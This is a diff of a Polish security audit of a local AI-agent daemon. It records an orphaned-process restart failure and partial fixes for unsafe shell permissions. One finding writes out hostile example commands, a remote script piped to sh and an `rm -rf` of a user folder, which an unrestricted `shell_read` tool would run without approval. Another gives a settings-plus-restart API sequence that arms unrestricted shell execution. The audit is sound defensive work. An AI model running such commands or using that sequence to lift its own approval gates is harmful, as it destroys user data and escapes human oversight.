@@ -49,6 +49,31 @@ Testy przechodzą, bo karmią `' '.join(SUPERTONIC_SPEC.argv)` albo wstrzykują
 `orphan_probe` — czyli sprawdzają logikę na danych, których produkcja nigdy nie
 wytworzy.
 
+### ZDARZYŁO SIĘ NA ŻYWO — 2026-07-21, 20:51
+
+To już nie jest wywód z kodu. Przy zwykłym `launchctl kickstart -k` (restart po
+zmianie configu) demon **nie wstał**: dwadzieścia parę sekund `HTTP 000`, a w
+`dand.err.log` dokładnie ta ścieżka — `ensure_running` → `_reject_foreign_owner_locked`
+→ `ForeignPortOwnerError: supertonic: ... already answers but the server is not a
+dand child`.
+
+Zmierzony winowajca, PID 98336:
+
+```
+ppid=1   /Users/n1_ozzy/.homebrew/.../Python \
+         /Users/n1_ozzy/.dan/venv/bin/supertonic serve --model supertonic-3 --port 7788 --log-level warning
+```
+
+Nasz venv, nasz model, nasz port, `ppid == 1` — czyli **własna sierota**, której
+`_is_own_orphan` nie rozpoznał wyłącznie przez doklejony przez jądro interpreter.
+Ręczny `SIGTERM` zwolnił port w sekundę i kolejny kickstart wstał normalnie.
+
+Wniosek praktyczny dla operatora: **każdy restart dand-a może się tak skończyć**, a
+objaw wygląda jak „demon padł", nie jak „port zajęty". Zanim zaczniesz debugować
+start, sprawdź `lsof -nP -iTCP:7788 -sTCP:LISTEN` i porównaj argv z venvem — jeśli
+to nasz supertonic z `ppid=1`, ubij go i wystartuj ponownie. To podnosi priorytet
+naprawy argv (razem z dowodem własności, patrz pułapka niżej).
+
 ### PUŁAPKA W KOLEJNOŚCI NAPRAW
 
 `_is_own_orphan` wymaga **obu** warunków: identyczne argv **i** `ppid == 1`.
@@ -87,8 +112,16 @@ Przy `security.shell_read_unrestricted = true` model emitujący
 `shell_read {"command": "curl -s http://x/p.sh | sh"}` albo `rm -rf ~/Documents/dev`
 wykonuje to bez allowlisty, bez wiersza approval i bez gatingu po źródle.
 Deklarowane w docstringu „approved-root containment" ogranicza **wyłącznie `cwd`** —
-argv niesie własne ścieżki absolutne. Narzędzie dalej raportuje `risk="shell_read"`
-i opisuje się modelowi jako read-only.
+argv niesie własne ścieżki absolutne.
+
+**Częściowo naprawione 2026-07-21:** narzędzie nie kłamie już modelowi o sobie.
+Instancja z `unrestricted=True` podmienia `description` i opis pola `command` na
+takie, które wprost mówią „NOT read-only" i „allowlist is OFF" (`ShellReadTool.__init__`,
+testy `test_unrestricted_tells_the_model_it_is_not_read_only` i
+`..._does_not_mutate_the_shared_class_schema`). To zamyka wprowadzanie mózgu w błąd,
+**nie zamyka samej dziury** — wykonanie dalej jest niebramkowane, a `risk` dalej
+raportuje `"shell_read"`. Zdejmowanie ryzyka wymagałoby ruszenia rejestru klas ryzyka
+i ledgera testów, więc zostaje otwarte.
 
 ## 3. Utwardzenie gita omijalne po zdjęciu allowlisty — POTWIERDZONE
 
@@ -167,9 +200,15 @@ security.require_approval_for_shell -> owner=versioned     writable=False
 ```
 
 Czyli sześć sąsiednich przełączników approval jest celowo tylko do odczytu,
-a ten jeden — nie. Przy `api_token_required` domyślnie `False` sekwencja
-`POST /settings` + `POST /runtime/restart` uzbraja dowolne wykonanie shella na
+a ten jeden — nie. Przy `api_token_required = False` sekwencja
+`POST /settings` + `POST /runtime/restart` uzbrajała dowolne wykonanie shella na
 stałe, bez dotykania pliku konfiguracyjnego.
+
+**Częściowo domknięte 2026-07-21:** `api_token_required` jest już `true`
+(zmierzone na żywym demonie), więc ta sekwencja wymaga teraz tokenu i nie da się
+jej odpalić ze strony w przeglądarce. **Sam rozjazd zostaje otwarty** — flaga
+nadal jest `writable=True` i nadal brakuje jej w `_VERSIONED_KEYS`, w
+przeciwieństwie do sześciu sąsiadek. Zamknięcie to dopisanie jej tam.
 
 ---
 
@@ -405,9 +444,15 @@ poprzednia wersja jego bannera „sent a debugging session down the wrong path".
 Komentarz opisujący intencję zamiast implementacji jest gorszy niż brak
 komentarza — kosztuje cudzą sesję, nie własną.
 
-## 18. Rozsypane worktree — wbrew regule Ozzy'ego
+## 18. Rozsypane worktree — ZAMKNIĘTE 2026-07-21
 
-`git worktree list` pokazuje dwa wpisy poza głównym checkoutem:
+**Usunięte na polecenie Ozzy'ego tego samego dnia.** `git worktree remove` na wpisie
+w `.claude/` i `git worktree prune` na martwym — `git worktree list` pokazuje dziś
+wyłącznie główny checkout. Gałęzie przeżyły usunięcie katalogów (worktree to katalog
+roboczy, nie magazyn commitów), więc nawet gdyby pomiar poniżej się mylił, nic nie
+przepadło. Opis zostaje jako dowód, po co ta zasada istnieje.
+
+`git worktree list` pokazywał wtedy dwa wpisy poza głównym checkoutem:
 
 | wpis | gałąź | stan |
 |---|---|---|
@@ -425,8 +470,7 @@ zdementowaną wersję modelu bezpieczeństwa jako obowiązującą. Każda popraw
 w `docs/` tę kopię omija.
 
 Globalne `CLAUDE.md` zakazuje worktree wprost („scattered worktrees lose work
-randomly", Ozzy 2026-07-13). **Nie usuwam ich z tej sesji** — usuwanie należy do
-Ozzy'ego, mimo że pomiar mówi, że nie ma czego stracić.
+randomly", Ozzy 2026-07-13).
 
 ---
 
